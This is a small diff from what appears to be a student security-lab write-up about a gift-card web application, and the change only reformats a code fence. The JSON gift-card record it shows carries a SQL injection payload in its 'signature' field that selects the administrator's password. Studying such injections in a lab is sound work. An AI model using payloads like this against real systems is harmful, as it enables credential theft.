@@ -166,7 +166,8 @@ we try
 
 the following payload is in our jbg469-sqli.gftcrd file
 
-```{"merchant_id": "NYU Apparel Card", "customer_id": "johnbg", "total_value": "10", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "'UNION SELECT password FROM Legacysite_user WHERE username='administrator' --"}]}
+```
+{"merchant_id": "NYU Apparel Card", "customer_id": "johnbg", "total_value": "10", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "'UNION SELECT password FROM Legacysite_user WHERE username='administrator' --"}]}
 ```
 
 
